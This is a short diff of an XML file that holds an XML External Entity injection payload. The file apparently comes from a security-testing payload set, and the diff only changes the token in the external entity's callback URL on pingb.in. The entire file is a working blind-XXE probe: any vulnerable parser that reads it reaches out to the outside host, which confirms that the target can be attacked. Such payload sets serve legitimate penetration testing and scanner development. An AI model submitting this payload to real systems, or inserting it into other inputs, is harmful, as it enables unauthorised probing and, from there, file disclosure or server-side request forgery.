@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
-<!ENTITY xxe SYSTEM "http://pingb.in/p/5e7a6b08bb81f50d2bc159197a79">]><foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "http://pingb.in/p/25a3ab00f7dc0971b904946a764a">]><foo>&xxe;</foo>
